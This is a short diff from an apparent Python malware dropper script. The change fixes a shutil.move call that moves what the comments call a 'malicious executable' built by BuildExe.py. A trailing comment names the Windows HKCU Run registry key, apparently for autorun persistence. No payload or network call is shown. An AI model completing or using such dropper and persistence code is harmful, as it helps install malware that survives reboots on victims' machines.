@@ -11,7 +11,7 @@ if os.path.isfile(filepath):
 os.system("python BuildExe.py")
 
 # Move malicious executable to desired directory
-shutil.move("filename,filedir")
+shutil.move(filename,filedir)
 
 # Windows default autorun keys:
 # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
